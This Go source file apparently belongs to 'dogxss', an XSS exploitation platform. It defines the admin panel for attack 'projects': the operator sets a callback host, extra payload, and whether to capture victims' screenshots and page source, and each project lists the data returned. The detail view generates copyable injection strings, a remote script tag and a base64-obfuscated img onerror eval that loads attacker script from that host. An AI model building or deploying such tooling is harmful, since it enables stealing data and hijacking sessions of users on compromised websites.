package tables

import (
	"dogxss/config"
	"dogxss/payload"
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/GoAdminGroup/go-admin/context"
	"github.com/GoAdminGroup/go-admin/modules/db"
	form2 "github.com/GoAdminGroup/go-admin/plugins/admin/modules/form"
	"github.com/GoAdminGroup/go-admin/plugins/admin/modules/table"
	"github.com/GoAdminGroup/go-admin/template/icon"
	"github.com/GoAdminGroup/go-admin/template/types"
	"github.com/GoAdminGroup/go-admin/template/types/action"
	"github.com/GoAdminGroup/go-admin/template/types/form"
	"strconv"
	"strings"
	"time"
)

func GetProjectsTable(ctx *context.Context) table.Table {
	project := table.NewDefaultTable(table.DefaultConfigWithDriverAndConnection("sqlite", "dogxss"))
	info := project.GetInfo().HideFilterArea()

	//info.WhereRaw("deleted_at IS NULL")
	info.SetDefaultPageSize(10) //只查询前30
	info.AddField("Id", "id", db.Integer).
		FieldFilterable().
		FieldSortable()
	info.AddField("项目名", "project_name", db.Varchar).FieldFilterable(types.FilterType{Operator: types.FilterOperatorLike}).
		FieldLabel(types.FieldLabelParam{Color: "#FF0000", Type: "danger"}).AddXssJsFilter().FieldWidth(200)
	info.AddField("Url", "project_url", db.Varchar).
		FieldFilterable(types.FilterType{Operator: types.FilterOperatorLike}).AddXssJsFilter().FieldXssFilter()
	info.AddField("备注", "project_info", db.Varchar).FieldFilterable(types.FilterType{Operator: types.FilterOperatorLike}).FieldWidth(100).
		FieldEditAble().FieldXssFilter().FieldXssFilter()
	info.AddField("时间", "project_time", db.Varchar).FieldSortable().FieldLimit(19).FieldWidth(200)
	info.AddField("Payload", "project_payload", db.Varchar).FieldHide()
	info.AddField("项目Id", "project_id", db.Varchar).FieldHide()
	//info.AddField("后缀", "project_file_name", db.Varchar).FieldHide()
	//info.AddColumnButtons("项目详细")
	info.SetTable("projects").SetTitle("我的项目").SetDescription("项目")
	info.SetSortDesc() //倒叙
	info.SetSortField("id")
	info.AddColumnButtons("", types.GetColumnButton("回传记录", icon.List, action.Jump(`/admin/info/project_returns?project_id={{(index .Value "project_id").Value}}`))).FieldWidth(50)
	info.SetFilterFormLayout(form.LayoutFourCol)
	info.SetFilterFormHeadWidth(2)

	formList := project.GetForm()
	formList.SetPrimaryKey("project_name", db.Varchar)
	formList.AddField("Id", "id", db.Integer, form.Default).
		FieldDisableWhenUpdate().FieldHide().FieldPostFilterFn(func(value types.PostFieldModel) interface{} {
		ids := payload.CountProJect()
		ids = ids + 1
		return ids
	})
	formList.AddField("上线地址", "project_url", db.Varchar, form.Url).FieldMust().FieldXssFilter().
		FieldHelpMsg("不用加https和/").FieldDefault(config.GetPayloadUrl())
	//formList.AddField("请求名", "project_file_name", db.Varchar, form.Text).FieldMust().FieldXssFilter().FieldHelpMsg("会在exp目录下生成payload,通过url加请求名获得xss(payload)")
	formList.AddField("项目名", "project_name", db.Varchar, form.Text).FieldDisplayButCanNotEditWhenUpdate().
		FieldMust().SetPostValidator(func(values form2.Values) error {
		if strings.Contains(values.Get("project_name"),",")&&strings.Contains(values.Get("project_name"),"/") {
			return errors.New("Err ")
		}
		return nil
	}).AddXssJsFilter().FieldTrimSpace().
		FieldXssFilter().FieldHelpMsg("会在exp目录下生成payload,通过url加请求名获得xss(payload),长度小于5,只支持字母或数字")
	formList.AddField("项目描述", "project_info", db.Varchar, form.Text).
		FieldDisableWhenUpdate().FieldMust().FieldTrimSpace().FieldXssFilter()
	formList.AddField("创建时间", "project_time", db.Varchar, form.Datetime).
		FieldDisableWhenUpdate().FieldDefault(time.Now().
		Format("2006-01-02 15:04:05")).FieldHide()
	formList.AddField("额外Payload", "project_payload", db.Varchar, form.Text).
		FieldPostFilterFn(func(value types.PostFieldModel) interface{} {
			pay := strings.Replace(value.Value.Value(), "%20", "", -1)
			return pay
		})
	formList.AddField("获取截图", "sc", db.Bool, form.SelectSingle).
		// 单选的选项，text代表显示内容，value代表对应值
		FieldOptions(types.FieldOptions{
			{Text: "启用", Value: "1"},
			{Text: "不启用", Value: "0"},
		}).
		// 设置默认值
		FieldDefault("0").FieldMust()
	formList.AddField("获取源码", "dom", db.Bool, form.SelectSingle).
		// 单选的选项，text代表显示内容，value代表对应值
		FieldOptions(types.FieldOptions{
			{Text: "启用", Value: "1"},
			{Text: "不启用", Value: "0"},
		}).
		// 设置默认值
		FieldDefault("0").FieldMust()
	formList.AddField("项目Id", "project_id", db.Varchar, form.Text).
		FieldHide().
		FieldDisplayButCanNotEditWhenUpdate().
		FieldDefault(base64.StdEncoding.EncodeToString([]byte(strconv.FormatInt(time.Now().Unix(), 10)))) //默认是时间戳作为项目唯一id
	formList.HideContinueEditCheckBox()
	formList.HideContinueNewCheckBox()
	//url:=ctx.Request.RequestURI

	formList.SetPostHook(func(values form2.Values) error {
		if values.PostError() == nil { //这里如果插入或者更新成功的话，可以更新创建payload
			//fmt.Println("插入或更新")
			sc := values.Get("sc")
			dom := values.Get("dom")
			if sc == "1" && dom == "1" {
				payload.MakePayload(values.Get("project_name"), values.Get("project_url"), values.Get("project_id"), values.Get("project_payload"), true, true)
			} else if sc != "1" && dom != "1" {
				payload.MakePayload(values.Get("project_name"), values.Get("project_url"), values.Get("project_id"), values.Get("project_payload"), false, false)
			} else if sc != "1" && dom == "1" {
				payload.MakePayload(values.Get("project_name"), values.Get("project_url"), values.Get("project_id"), values.Get("project_payload"), false, true)
			} else if sc == "1" && dom != "1" {
				payload.MakePayload(values.Get("project_name"), values.Get("project_url"), values.Get("project_id"), values.Get("project_payload"), true, false)
			}
		}

		return nil
	})
	formList.SetPostValidator(func(values form2.Values) error {
		if len(values.Get("project_name")) > 5 {
			return fmt.Errorf("error info")
		}
		return nil
	})
	formList.SetTable("projects").SetTitle("新加项目").SetDescription("新加项目")
	detail := project.GetDetail()
	detail.AddField("ID", "id", db.Int).FieldWidth(20)
	detail.AddField("项目名", "project_name", db.Varchar).FieldXssFilter()
	detail.AddField("备注", "project_info", db.Varchar).FieldXssFilter()
	detail.AddField("创建时间", "project_time", db.Varchar)
	detail.AddField("项目标识", "project_id", db.Varchar).FieldXssFilter()
	detail.AddField("额外Payload", "project_payload", db.Varchar).FieldXssFilter()
	//detail.AddField("url", "project_url", db.Varchar).FieldHide()
	//detail.AddField("name", "project_file_name", db.Varchar).FieldXssFilter().FieldHide()
	detail.AddField("Exp", "project_url", db.Varchar).FieldDisplay(func(model types.FieldModel) interface{} {
		replacer := strings.NewReplacer("<", "&lt;", ">", "&gt;", "\n", "<br>")
		//str:=strings.Replace(replacer.Replace(model.Value),"&lt;br&gt;","<br>",-1)

		return "<script src=//" + replacer.Replace(model.Value) + "/" + config.Payload + "/" + model.Row["project_name"].(string) + ">"
	}).FieldXssFilter().FieldCopyable("Copy")
	detail.AddField("Exp2", "project_url", db.Varchar).FieldDisplay(func(model types.FieldModel) interface{} {
		replacer := strings.NewReplacer("<", "&lt;", ">", "&gt;", "\n", "<br>")
		//str:=strings.Replace(replacer.Replace(model.Value),"&lt;br&gt;","<br>",-1)
		url2 := replacer.Replace(model.Value) + "/" + config.Payload + "/" + model.Row["project_name"].(string)
		url2 = fmt.Sprintf("var a=document.createElement(\"script\");a.src=\"//%s\";document.body.appendChild(a);", url2)
		url23 := base64.StdEncoding.EncodeToString([]byte(url2))
		return "<img style='display:none' src=x onerror=eval(atob('" + url23 + "'));>"
	}).FieldXssFilter().AddCSS("").FieldWidth(200).FieldCopyable("Copy")
	return project
}
